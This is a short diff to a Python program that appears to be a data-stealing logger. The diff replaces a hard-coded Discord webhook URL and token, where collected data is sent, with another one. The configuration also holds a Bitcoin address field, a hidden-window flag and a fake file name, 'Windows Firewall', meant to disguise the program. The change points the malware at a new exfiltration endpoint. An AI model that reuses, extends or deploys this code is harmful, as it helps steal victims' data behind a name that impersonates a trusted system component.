@@ -31,7 +31,7 @@ from base64 import b64decode
 
 # Configuration
 BTC_ADDRESS = ''
-webhookURL = "https://discord.com/api/webhooks/1457482515378995387/hFwOk91ysaqLx3zO6B7ZW-tzazbYp-bsdR1C97TeH0RrkcMKRuegG2LJdIi0Avx4nnG5"
+webhookURL = "https://canary.discord.com/api/webhooks/1458224314561204355/YXFKDCwRPdKOThz34NtfRUyBSi-Oib01x-6vU5rElrLC90F85c2aG_GhGj4sf9XOc2ag"
 hiddenWindow = False
 FakeFileName = "Windows Firewall"
 
@@ -396,6 +396,7 @@ class Logger():
 
 if __name__ == '__main__':
     Logger.start()
+
 
 
 
